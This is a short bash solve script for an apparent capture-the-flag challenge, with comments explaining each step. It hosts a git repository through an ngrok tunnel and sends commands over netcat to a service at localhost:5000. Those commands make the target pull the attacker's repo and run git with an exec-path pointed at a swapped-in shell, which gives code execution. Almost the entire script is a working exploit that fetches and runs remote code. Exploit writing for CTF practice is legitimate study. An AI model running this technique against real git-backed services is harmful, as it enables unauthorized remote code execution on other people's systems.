#!/bin/bash
# to solve this challenge, we are going to locally host a git server 
# and use it to deliver our payload to the site
mv repo/git repo/.git

BASE_HOST="localhost"
BASE_PORT=5000

docker compose up -d

tmux split-window -v "ngrok http 8080"

sleep 1

NGROK_URL="$(curl -s localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url')"

printf "NGROK_URL: $NGROK_URL\n"

# once we have the site running, we will create a git directory and apply whatever permissions we have locally,
# and then run a fake git file using git --exec-path, which lets you change where git looks for executables
# you can pick any git command to replace with sh, as long as the command was originally sh
payload="git init
git remote add origin $NGROK_URL/repo.git
git pull origin main
git cache-meta --apply
git --exec-path=/srv/execs mergetools
end"

# send the payload to the server
cat <(echo "$payload") - | nc $BASE_HOST $BASE_PORT

sleep 1

# cleanup
killall ngrok
docker compose down
mv repo/.git repo/git
